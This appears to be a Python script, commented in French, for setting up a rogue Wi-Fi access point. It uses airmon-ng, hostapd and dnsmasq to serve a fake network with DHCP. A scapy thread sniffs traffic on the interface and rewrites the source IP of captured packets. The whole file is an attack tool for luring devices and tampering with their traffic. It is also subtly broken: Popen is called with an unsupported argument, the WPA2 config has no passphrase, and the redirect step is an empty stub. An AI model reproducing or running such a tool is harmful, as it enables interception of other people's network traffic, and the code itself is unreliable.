import subprocess
import sys
import argparse
from scapy.all import *
import threading

def set_interface_mode_ap(interface):
    """
    Configure l'interface en mode AP en tuant les processus susceptibles d'interférer
    et en réglant le mode de l'interface.
    """
    print(f"Configuration de l'interface {interface} en mode AP...")
    try:
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
        subprocess.run(["sudo", "ip", "link", "set", interface, "down"], check=True)
        subprocess.run(["sudo", "iw", "dev", interface, "set", "type", "ap"], check=True)
        subprocess.run(["sudo", "ip", "link", "set", interface, "up"], check=True)
        print(f"Interface {interface} configurée en mode AP.")
    except subprocess.CalledProcessError as e:
        print(f"Erreur lors de la configuration en mode AP: {e}")
    
    

def create_access_point(interface, ssid):
    
    set_interface_mode_ap(interface)
    
    print(f"Création d'un point d'acces wifi {ssid} sur l'interface {interface}")
    channel = 6
    
    # Configuration de l'interface
    hostapd_config = f"""
interface={interface}
ssid={ssid}
hw_mode=g
channel={channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
    
    with open("/tmp/hostapd.conf", "w") as config_file:
        config_file.write(hostapd_config)
        
    dnsmask_config = f"""
interface={interface}
dhcp-range=192.168.150.10,192.168.150.50,255.255.255.0,12h
"""
    
    with open("/tmp/dnsmasq.conf", "w") as config_file:
        config_file.write(dnsmask_config)
        
    # Démarrage des services
    try:
        subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd.conf"], check=True)
        print(f"Point d'acces wifi {ssid} démarré avec succès sur l'interface {interface}")
        
        subprocess.Popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq.conf", "-d"], check=True)
        print("Serveur DHCP démarré avec succès") 
        
    except subprocess.CalledProcessError as e:
        print(f"Erreur lors du démarrage du point d'acces: {e}")
        
    

def capture_and_modify_packets(interface):
    print(f"Capture et modification de paquets sur l'interface {interface}")

    def packet_handler(packet):
        if packet.haslayer(IP):
            # Modifier l'adresse IP source
            packet[IP].src = "192.168.1.100"
            print(f"Paquet modifié: {packet.summary()}")

    sniff(iface=interface, prn=packet_handler)

def start_capture_thread(interface):
    capture_thread = threading.Thread(target=capture_and_modify_packets, args=(interface,))
    capture_thread.daemon = True 
    capture_thread.start()
    print(f"Thread de capture démarré sur l'interface {interface}")


def redirect_requests():
    print("Redirection des requêtes vers internet")


        
def main():
    # Si il n'y a pas d'arguments:
    if len(sys.argv) < 2:
        print("Usage: python3 main.py -i <interface> -n <nom du réseau> [-c] [-cp] [-r]")
        sys.exit(1)
        
    # Si il y a des arguments:
    parser = argparse.ArgumentParser(description="Script permettant de créer un RogueAP et capturer les paquets")
    parser.add_argument("-i", "--interface", required=True, help="Interface réseau")
    parser.add_argument("-n", "--name", required=True, help="Nom du réseau")
    parser.add_argument("-c", "--create", action="store_true", help="Créer un point d'acces wifi")
    parser.add_argument("-cp", "--capture", action="store_true", help="Capturer et modifier les paquets")
    parser.add_argument("-r", "--redirect", action="store_true", help="Rediriger les requêtes vers internet")
    args = parser.parse_args()
    
    if args.create:
        create_access_point(args.interface, args.name)
    
    if args.capture:
        start_capture_thread(args.interface)
    
    if args.redirect:
        redirect_requests()
    
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("Arrêt du script")
        
if __name__ == "__main__":
    main()
        
    